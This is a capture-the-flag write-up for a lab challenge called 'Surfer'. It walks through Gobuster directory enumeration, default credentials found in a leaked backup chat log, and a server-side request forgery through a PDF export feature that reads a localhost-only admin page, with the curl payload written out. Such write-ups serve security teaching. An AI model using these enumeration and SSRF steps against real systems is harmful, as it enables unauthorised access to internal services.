# Surfer

## Challenge Overview

The challenge provides a **login page**. The goal is to find and read a flag hidden on an internal server.

---

## Exploitation

### Step 1 — Directory Enumeration with Gobuster

Inspecting the page source and debugger revealed nothing useful, so we ran Gobuster to discover hidden directories:

```bash
gobuster dir -u http://10.114.171.83 \
  -w /path/to/directory-list-2.3-medium.txt
```

```
assets    (Status: 301)
vendor    (Status: 301)
backup    (Status: 301)  ← suspicious to check 
internal  (Status: 301)  ← suspicious to check 
```

### Step 2 — Enumerate /backup/

```bash
gobuster dir -u http://10.114.171.83/backup/ \
  -w /path/to/directory-list-2.3-medium.txt \
  -x php,txt,sql,zip,bak,tar.gz
```

```
chat.txt  (Status: 200)
```

Reading `http://10.114.171.83/backup/chat.txt`:

```
Admin: I have finished setting up the new export2pdf tool.
Kate:  Have you finished adding the internal server.
Admin: Yes, it should be serving flag from now.
Kate:  Also don't forget to change the creds, plz stop using your username as password.
```

✅ Credentials found: `admin:admin`

### Step 3 — Enumerate /internal/

```bash
gobuster dir -u http://10.114.171.83/internal/ \
  -w /path/to/directory-list-2.3-medium.txt \
  -x php,txt,sql
```

```
admin.php  (Status: 200)
```

Visiting `http://10.114.171.83/internal/admin.php` directly returns:

```
This page can only be accessed locally.
```

The flag is locked behind a **localhost-only restriction**.

### Step 4 — SSRF via export2pdf

After logging in with `admin:admin`, the dashboard has an **Export to PDF** button.

Intercepting the request in **Caido** revealed the PDF export sends:

```
url=http%3A%2F%2F127.0.0.1%2Fserver-info.php
```

The server fetches a URL on our behalf — a classic **Server-Side Request Forgery (SSRF)** vector. Since the request originates from the server itself, it bypasses the localhost restriction on `/internal/admin.php`.

### Step 5 — Exploit SSRF to Read the Flag

We replace the URL parameter with the internal admin page:

```bash
curl -X POST http://10.114.171.83/export2pdf.php \
  -b "PHPSESSID=08109f7178b5c66e8277182018a874c4" \
  -d "url=http://127.0.0.1/internal/admin.php" \
  -o flag.pdf

open flag.pdf
```

🏁 Flag retrieved.

---

## Key Takeaway

> **Never trust user-supplied URLs in server-side fetch functions.** The `export2pdf` feature fetched any URL the client specified — including internal services. Combined with credentials left in a public backup file, this gave full access to a localhost-restricted admin page.
```
